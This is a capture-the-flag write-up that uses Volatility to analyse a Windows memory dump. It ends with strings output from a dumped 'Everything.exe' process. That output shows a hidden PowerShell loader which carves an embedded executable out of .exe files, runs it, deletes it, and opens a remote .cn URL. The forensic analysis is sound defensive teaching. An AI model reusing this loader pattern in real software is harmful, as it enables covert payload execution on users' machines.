# MISC-BOOM

<img width="893" alt="screen shot 2018-04-21 at 7 57 18 pm" src="https://user-images.githubusercontent.com/14992494/39083973-70d5f5da-45a0-11e8-90f2-e0dae583e944.png">

This question was memory forensic. Volatility was used to analysis windows memory dump file.

```
root@kali:~/Desktop/xctf# volatility -f BOOM-6452e9b9.vmem imageinfo
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
 AS Layer2 : FileAddressSpace (/root/Desktop/xctf/BOOM-6452e9b9.vmem)
  PAE type : No PAE
  DTB : 0x187000L
 KDBG : 0xf80003fff0a0L
Number of Processors : 2
Image Type (Service Pack) : 1
 KPCR for CPU 0 : 0xfffff80004000d00L
 KPCR for CPU 1 : 0xfffff880009ef000L
   KUSER_SHARED_DATA : 0xfffff78000000000L
 Image date and time : 2018-04-05 08:29:56 UTC+0000
Image local date and time : 2018-04-05 16:29:56 +0800
```

Based on the resilt of cmdline command, suspicious doc file For_You.docx was found with 3316 PID.

```
root@kali:~/Desktop/xctf# volatility -f BOOM-6452e9b9.vmem --profile Win7SP1x64 cmdline
Volatility Foundation Volatility Framework 2.6
************************************************************************
System pid: 4
************************************************************************
smss.exe pid:    276
Command line : \SystemRoot\System32\smss.exe
************************************************************************
csrss.exe pid:    364
Command line : %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
************************************************************************
wininit.exe pid:    416
Command line : wininit.exe
************************************************************************
csrss.exe pid:    432
Command line : %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
************************************************************************
winlogon.exe pid:    480
Command line : winlogon.exe
************************************************************************
services.exe pid:    516
Command line : C:\Windows\system32\services.exe
************************************************************************
lsass.exe pid:    532
Command line : C:\Windows\system32\lsass.exe
************************************************************************
lsm.exe pid:    540
Command line : C:\Windows\system32\lsm.exe
************************************************************************
svchost.exe pid:    664
Command line : C:\Windows\system32\svchost.exe -k DcomLaunch
************************************************************************
vmacthlp.exe pid:    724
Command line : "C:\Program Files\VMware\VMware Tools\vmacthlp.exe"
************************************************************************
svchost.exe pid:    768
Command line : C:\Windows\system32\svchost.exe -k RPCSS
************************************************************************
svchost.exe pid:    832
Command line : C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted
************************************************************************
svchost.exe pid:    892
Command line : C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted
************************************************************************
svchost.exe pid:    936
Command line : C:\Windows\system32\svchost.exe -k netsvcs
************************************************************************
svchost.exe pid:    600
Command line : C:\Windows\system32\svchost.exe -k LocalService
************************************************************************
svchost.exe pid:   1112
Command line : C:\Windows\system32\svchost.exe -k NetworkService
************************************************************************
spoolsv.exe pid:   1212
Command line : C:\Windows\System32\spoolsv.exe
************************************************************************
svchost.exe pid:   1244
Command line : C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork
************************************************************************
VGAuthService. pid:   1384
Command line : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
************************************************************************
vmtoolsd.exe pid:   1456
Command line : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
************************************************************************
ManagementAgen pid:   1480
Command line : "C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe"
************************************************************************
WmiPrvSE.exe pid:   1852
Command line : C:\Windows\system32\wbem\wmiprvse.exe
************************************************************************
dllhost.exe pid:   1896
Command line : C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
************************************************************************
msdtc.exe pid:   1992
Command line : C:\Windows\System32\msdtc.exe
************************************************************************
taskhost.exe pid:   2388
Command line : "taskhost.exe"
************************************************************************
dwm.exe pid:   2508
Command line : "C:\Windows\system32\Dwm.exe"
************************************************************************
explorer.exe pid:   2532
Command line : C:\Windows\Explorer.EXE
************************************************************************
vmtoolsd.exe pid:   2632
Command line : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
************************************************************************
mscorsvw.exe pid:   2764
Command line : C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe
************************************************************************
svchost.exe pid:   2800
Command line : C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation
************************************************************************
mscorsvw.exe pid:   2880
Command line : C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe
************************************************************************
sppsvc.exe pid:   2932
Command line : C:\Windows\system32\sppsvc.exe
************************************************************************
svchost.exe pid:   2968
Command line : C:\Windows\System32\svchost.exe -k secsvcs
************************************************************************
SearchIndexer. pid:   3016
Command line : C:\Windows\system32\SearchIndexer.exe /Embedding
************************************************************************
svchost.exe pid:   1088
Command line : C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted
************************************************************************
dllhost.exe pid:   2364
Command line : C:\Windows\system32\DllHost.exe /Processid:{76D0CB12-7604-4048-B83C-1005C7DDC503}
************************************************************************
StikyNot.exe pid:   2252
Command line : "C:\Windows\system32\StikyNot.exe" 
************************************************************************
cmd.exe pid:   1096
************************************************************************
cmd.exe pid:   1348
************************************************************************
sc.exe pid:   3064
************************************************************************
netsh.exe pid:   2428
************************************************************************
csrss.exe pid:   1836
Command line : %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
************************************************************************
winlogon.exe pid:    888
Command line : winlogon.exe
************************************************************************
csrss.exe pid:   2984
Command line : %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
************************************************************************
SearchProtocol pid:   2752
Command line : "C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe8_ Global\UsGthrCtrlFltPipeMssGthrPipe8 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" 
************************************************************************
winlogon.exe pid:   2212
Command line : winlogon.exe
************************************************************************
SearchFilterHo pid:   1260
Command line : "C:\Windows\system32\SearchFilterHost.exe" 0 532 536 544 65536 540 
************************************************************************
LogonUI.exe pid:   1672
Command line : "LogonUI.exe" /flags:0x0
************************************************************************
taskhost.exe pid:   1340
Command line : "taskhost.exe"
************************************************************************
rdpclip.exe pid:   2460
Command line : rdpclip
************************************************************************
dwm.exe pid:   2228
Command line : "C:\Windows\system32\Dwm.exe"
************************************************************************
explorer.exe pid:   1564
Command line : C:\Windows\Explorer.EXE
************************************************************************
regsvr32.exe pid:   2736
************************************************************************
vmtoolsd.exe pid:   3748
Command line : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
************************************************************************
Everything.exe pid:   3764
Command line : "C:\Windows\System32\Everything.exe" 
************************************************************************
audiodg.exe pid:   3960
Command line : C:\Windows\system32\AUDIODG.EXE 0x728
************************************************************************
SearchProtocol pid:   1820
Command line : "C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe_S-1-5-21-4129855223-3386970227-3519833171-10019_ Global\UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-4129855223-3386970227-3519833171-10019 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"  "1"
************************************************************************
wordpad.exe pid:   3316
Command line : "C:\Program Files\Windows NT\Accessories\WORDPAD.EXE" "C:\Users\ADMIN\Desktop\For_You.docx"
************************************************************************
cmd.exe pid:   3372
************************************************************************
conhost.exe pid:   3368
Command line : \??\C:\Windows\system32\conhost.exe
************************************************************************
ipconfig.exe pid:   3440
```

"wordpad.exe" was found as a descendant process of "explorer.exe" and there was another suspicious "Everything.exe" process.

```
root@kali:~/Desktop/xctf# volatility -f BOOM-6452e9b9.vmem --profile Win7SP1x64 pstree
Volatility Foundation Volatility Framework 2.6
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xfffffa8003ed1060:wininit.exe                       416    344      3     79 2018-04-04 15:28:26 UTC+0000
. 0xfffffa8004236610:lsass.exe                        532    416     10    855 2018-04-04 15:28:26 UTC+0000
. 0xfffffa8004228b30:services.exe                     516    416     13    243 2018-04-04 15:28:26 UTC+0000
.. 0xfffffa800433eb30:svchost.exe                     768    516      9    315 2018-04-04 15:28:26 UTC+0000
.. 0xfffffa8001dcf060:mscorsvw.exe                   2880    516      6     96 2018-04-04 15:30:29 UTC+0000
.. 0xfffffa8004485540:svchost.exe                    1112    516     25    606 2018-04-04 15:28:27 UTC+0000
... 0xfffffa8001ca7390:rdpclip.exe                   2460   1112     10    166 2018-04-05 08:29:07 UTC+0000
.. 0xfffffa800430e970:svchost.exe                     664    516     12    379 2018-04-04 15:28:26 UTC+0000
... 0xfffffa800207bb30:dllhost.exe                   2364    664      9    217 2018-04-04 15:49:16 UTC+0000
... 0xfffffa8003443b30:WmiPrvSE.exe                  1852    664     10    221 2018-04-04 15:28:29 UTC+0000
.. 0xfffffa8001e34b30:SearchIndexer.                 3016    516     16    876 2018-04-04 15:30:30 UTC+0000
... 0xfffffa8001d0bb30:SearchProtocol                1820   3016      7    230 2018-04-05 08:29:26 UTC+0000
... 0xfffffa80029be330:SearchFilterHo                1260   3016      7    172 2018-04-05 08:29:06 UTC+0000
... 0xfffffa8001935060:SearchProtocol                2752   3016      9    427 2018-04-05 08:29:06 UTC+0000
.. 0xfffffa80043a8b30:svchost.exe                     936    516     48   1242 2018-04-04 15:28:26 UTC+0000
.. 0xfffffa80045e4210:vmtoolsd.exe                   1456    516      9    293 2018-04-04 15:28:28 UTC+0000
... 0xfffffa80029cc5f0:cmd.exe                       3372   1456      0 ------ 2018-04-05 08:29:56 UTC+0000
.... 0xfffffa8002bb62b0:ipconfig.exe                 3440   3372      0 ------ 2018-04-05 08:29:56 UTC+0000
.. 0xfffffa80046d81f0:msdtc.exe                      1992    516     12    147 2018-04-04 15:28:29 UTC+0000
.. 0xfffffa8001e60b30:svchost.exe                    2968    516     14    326 2018-04-04 15:30:29 UTC+0000
.. 0xfffffa8001cc6b30:taskhost.exe                   1340    516     11    228 2018-04-05 08:29:07 UTC+0000
.. 0xfffffa8004490b30:spoolsv.exe                    1212    516     19    470 2018-04-04 15:28:27 UTC+0000
... 0xfffffa80046dab30:cmd.exe                       1348   1212      0 ------ 2018-04-05 08:27:22 UTC+0000
... 0xfffffa8002173680:netsh.exe                     2428   1212      0 ------ 2018-04-05 08:28:07 UTC+0000
... 0xfffffa8001fec060:sc.exe                        3064   1212      0 ------ 2018-04-05 08:28:07 UTC+0000
... 0xfffffa8001fd6060:cmd.exe                       1096   1212      0 ------ 2018-04-05 08:25:33 UTC+0000
.. 0xfffffa8004371060:svchost.exe                     832    516     21    508 2018-04-04 15:28:26 UTC+0000
... 0xfffffa80029c7540:audiodg.exe                   3960    832      6    130 2018-04-05 08:29:20 UTC+0000
.. 0xfffffa80045e9b30:ManagementAgen                 1480    516     10     89 2018-04-04 15:28:28 UTC+0000
.. 0xfffffa80044af1a0:mscorsvw.exe                   2764    516      6    102 2018-04-04 15:30:28 UTC+0000
.. 0xfffffa800218eb30:svchost.exe                    1088    516      6    108 2018-04-04 15:41:44 UTC+0000
.. 0xfffffa8002fcab30:taskhost.exe                   2388    516      9    208 2018-04-04 15:30:26 UTC+0000
.. 0xfffffa8004332920:vmacthlp.exe                    724    516      3     56 2018-04-04 15:28:26 UTC+0000
.. 0xfffffa8004448b30:svchost.exe                     600    516     16    616 2018-04-04 15:28:26 UTC+0000
.. 0xfffffa80044de7e0:svchost.exe                    1244    516     18    337 2018-04-04 15:28:27 UTC+0000
.. 0xfffffa80045b4060:VGAuthService.                 1384    516      3     90 2018-04-04 15:28:27 UTC+0000
.. 0xfffffa8001db9b30:svchost.exe                    2800    516     11    142 2018-04-04 15:30:28 UTC+0000
.. 0xfffffa8004709b30:dllhost.exe                    1896    516     14    206 2018-04-04 15:28:29 UTC+0000
.. 0xfffffa8001dfc060:sppsvc.exe                     2932    516      4    150 2018-04-04 15:30:29 UTC+0000
.. 0xfffffa800437cb30:svchost.exe                     892    516     23    536 2018-04-04 15:28:26 UTC+0000
... 0xfffffa8001d15b30:dwm.exe                       2228    892      6     94 2018-04-05 08:29:07 UTC+0000
... 0xfffffa80026e5a30:dwm.exe                       2508    892      5     77 2018-04-04 15:30:26 UTC+0000
. 0xfffffa8004234060:lsm.exe                          540    416     14    277 2018-04-04 15:28:26 UTC+0000
 0xfffffa8003c5cb30:csrss.exe                         364    344      9    584 2018-04-04 15:28:25 UTC+0000
. 0xfffffa8001c7f060:conhost.exe                     3368    364      0     29 2018-04-05 08:29:56 UTC+0000
 0xfffffa80018bc990:System                              4      0     95    464 2018-04-04 15:28:25 UTC+0000
. 0xfffffa8002f4bb30:smss.exe                         276      4      4     36 2018-04-04 15:28:25 UTC+0000
 0xfffffa8001d23b30:explorer.exe                     1564   1624     32    744 2018-04-05 08:29:07 UTC+0000
. 0xfffffa8001c5d060:wordpad.exe                     3316   1564      5    136 2018-04-05 08:29:50 UTC+0000
. 0xfffffa8001bec630:vmtoolsd.exe                    3748   1564      5    145 2018-04-05 08:29:19 UTC+0000
. 0xfffffa8002b2e810:Everything.exe                  3764   1564      6    127 2018-04-05 08:29:20 UTC+0000
. 0xfffffa8001b36b30:regsvr32.exe                    2736   1564      0 ------ 2018-04-05 08:29:08 UTC+0000
 0xfffffa8001b228d0:csrss.exe                        2984   2380      9     80 2018-04-05 08:29:06 UTC+0000
 0xfffffa8001bf3b30:winlogon.exe                     2212   2380      5    103 2018-04-05 08:29:06 UTC+0000
. 0xfffffa800193bb30:LogonUI.exe                     1672   2212      9    198 2018-04-05 08:29:06 UTC+0000
 0xfffffa8003edb7b0:csrss.exe                         432    408      8    228 2018-04-04 15:28:26 UTC+0000
 0xfffffa8004213060:winlogon.exe                      480    408      4    119 2018-04-04 15:28:26 UTC+0000
 0xfffffa8001acab30:csrss.exe                        1836   2092      8    250 2018-04-05 08:28:11 UTC+0000
 0xfffffa8001aa0b30:winlogon.exe                      888   2092      4    119 2018-04-05 08:28:11 UTC+0000
 0xfffffa800448a5b0:explorer.exe                     2532   2492     29    956 2018-04-04 15:30:26 UTC+0000
. 0xfffffa80021e1460:StikyNot.exe                    2252   2532      9    167 2018-04-04 15:49:33 UTC+0000
. 0xfffffa8001d74060:vmtoolsd.exe                    2632   2532      6    198 2018-04-04 15:30:26 UTC+0000
```

Powershell script was embeded in the "Everything.exe". As this question description, the malicious downloader URL was the reason of this case.

```
root@kali:~/Desktop/xctf# volatility -f BOOM-6452e9b9.vmem --profile Win7SP1x64 procdump -p 3764 -D ./
Volatility Foundation Volatility Framework 2.6
Process(V)         ImageBase          Name                 Result
------------------ ------------------ -------------------- ------
0xfffffa8002b2e810 0x0000000000400000 Everything.exe       OK: executable.3764.exe

root@kali:~/Desktop/xctf# strings executable.3764.exe 
powershell -WindowStyle Hidden -Command "Get-ChildItem .\ | ForEach-Object -Process {if($_ -is [System.IO.FileInfo]){if($_.FullName.indexof(""".exe""") -eq -1){return;}$cont = (Get-Content -raw $_.FullName);if($cont.indexof("""qwedcxzarfvbnhyt""") -eq -1){return;}echo $_.FullName;[byte[]]$bytes = [System.IO.File]::ReadAllBytes($_.FullName);Set-Content -Path """.\temp.exe""" -Value $Bytes[-0X19010..-0X11] -encoding Byte;.\temp.exe;rm .\temp.exe;}};Start-Process -FilePath http://HYTN_B_C_DoRR_.cn;"
```

### Flag

HYTN_B_C_DoRR_.cn

<img width="284" alt="screen shot 2018-04-21 at 7 57 26 pm" src="https://user-images.githubusercontent.com/14992494/39083974-710e4ea8-45a0-11e8-95e8-23f941ebf352.png">
